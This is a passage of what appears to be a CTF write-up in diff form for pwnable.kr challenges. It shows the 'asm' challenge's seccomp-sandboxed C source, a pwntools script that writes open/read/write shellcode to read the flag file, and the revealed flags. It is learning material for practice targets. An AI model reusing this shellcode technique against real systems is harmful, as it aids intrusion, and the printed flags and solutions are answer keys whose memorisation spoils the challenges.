@@ -405,3 +405,103 @@ col@ubuntu:~$ ./col $( echo -en '\xcc\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x0
 daddy! I just managed to create a hash collision :)
 ```
 ```Flag : daddy! I just managed to create a hash collision :) ```
+
+# asm
+```C
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <seccomp.h>
+#include <sys/prctl.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define LENGTH 128
+
+void sandbox(){
+	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
+	if (ctx == NULL) {
+		printf("seccomp error\n");
+		exit(0);
+	}
+
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
+	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
+
+	if (seccomp_load(ctx) < 0){
+		seccomp_release(ctx);
+		printf("seccomp error\n");
+		exit(0);
+	}
+	seccomp_release(ctx);
+}
+
+char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
+
+unsigned char filter[256];
+int main(int argc, char* argv[]){
+
+	setvbuf(stdout, 0, _IONBF, 0);
+	setvbuf(stdin, 0, _IOLBF, 0);
+
+	printf("Welcome to shellcoding practice challenge.\n");
+	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
+	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
+	printf("If this does not challenge you. you should play 'asg' challenge :)\n");
+
+	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
+	memset(sh, 0x90, 0x1000);
+	memcpy(sh, stub, strlen(stub));
+
+	int offset = sizeof(stub);
+	printf("give me your x64 shellcode: ");
+	read(0, sh+offset, 1000);
+
+	alarm(10);
+	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
+	sandbox();
+	((void (*)(void))sh)();
+	return 0;
+}
+```
+we are in sandbox that allows ```read```,```write```,```open``` and ```exit``` sys calls 
+<br>
+the stab char is nothing but a registers cleaner so have to not worry about any pre existing values.
+<br>
+using ```pwn tools``` i could easly get the flag.
+```python
+from pwn import *                                                                                                
+                                                                                                                 
+con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)                                            
+p = con.connect_remote('localhost', 9026)                                                                        
+                                                                                                                 
+context(arch='amd64', os='linux')                                                                                
+                                                                                                                 
+flag = ('this_is_pwnable.kr_flag_file_please_read_this' +                                                        
+        '_file.sorry_the_file_name_is_very_loooooooooo' +                                                        
+        'ooooooooooooooooooooooooooooooooooooooooooooo' +                                                        
+        'ooooooooooooooooooooo000000000000000000000000' +                                                        
+        '0ooooooooooooooooooooooo000000000000o0o0o0o0o' +                                                        
+        '0o0ong')                                                                                                
+                                                                                                                 
+shellcode = shellcraft.open(flag)                                                                                
+# shellcraft.amd64.linux.write(file)                                                                             
+                                                                                                                 
+shellcode += shellcraft.read('rax', 'rsp', 100)                                                                  
+'''                                                                                                              
+pwnlib.shellcraft.amd64.linux.read(fd=0, buffer='rsp', count=8)[source]                                          
+Reads data from the file descriptor into the provided buffer.This is a one-shot and does not fill the request.   
+'''                                                                                                              
+                                                                                                                 
+shellcode += shellcraft.write(1, 'rsp', 100)                                                                     
+# shellcraft.amd64.linux.write(fd, buf, size)                                                                    
+                                                                                                                 
+p.recvuntil('shellcode: ')                                                                                       
+```
+![screenshot_20180723_173958](https://user-images.githubusercontent.com/22657154/43089496-72606920-8ead-11e8-9dd3-c7381ded8719.png)
+
+```Flag : Mak1ng_shelLcodE_i5_veRy_eaSy```
